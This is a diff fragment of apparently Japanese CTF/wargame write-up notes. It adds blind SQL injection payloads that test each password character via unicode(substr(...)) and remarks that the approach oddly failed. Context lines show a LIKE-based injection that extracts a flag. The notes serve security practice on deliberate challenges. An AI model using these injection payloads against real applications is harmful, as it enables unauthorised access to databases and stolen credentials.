@@ -1146,6 +1146,14 @@ flag_kpwa4ji3uzk6trpk#
 admin' and pass like 'flag_kpwa4ji3uzk6trpk#%' -- -
 result: flag_kpwa4ji3uzk6trpk
 ```
+あと、以下のように`unicode`(mysqlでのascii)を使うとなんかうまく行かなかった…なんでだ？？？  
+```txt
+admin' and unicode(substr(pass,1,1))=100 -- -
+admin' and unicode(substr(pass,1,1))=101 -- -
+admin' and unicode(substr(pass,1,1))=102 -- -
+admin' and unicode(substr(pass,1,1))=103 -- -
+admin' and unicode(substr(pass,1,1))=104 -- -
+```
 ## wargame.kr
 ### inject into order by / blind Injection (dbms335)
 https://taiyakon.com/2017/09/ctfwargamekr-19-dbms335writeup.html  
